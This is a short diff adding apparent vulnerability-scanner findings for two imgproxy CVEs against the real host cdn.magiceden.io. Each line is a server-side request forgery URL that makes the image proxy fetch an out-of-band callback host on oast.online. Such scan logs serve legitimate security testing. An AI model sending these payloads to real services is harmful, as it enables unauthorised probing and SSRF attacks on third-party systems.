@@ -1,0 +1,3 @@
+[CVE-2023-30019] [http] [medium] https://cdn.magiceden.io/111/rs:fit:400:400:0:0/plain/http://da5ede04fjmjfniv5hegp77bxmftdoedc.oast.online
+[CVE-2023-30019] [http] [medium] https://cdn.magiceden.io/111/rs:fit:400:400:0:0/plain/http://da5ede04fjmjfniv5hegp77bxmftdoedc.oast.online
+[CVE-2025-24354] [http] [medium] https://cdn.magiceden.io/unsafe/plain/http://da5ede04fjmjfniv5heg9yzs3ksuu7u3d.oast.online
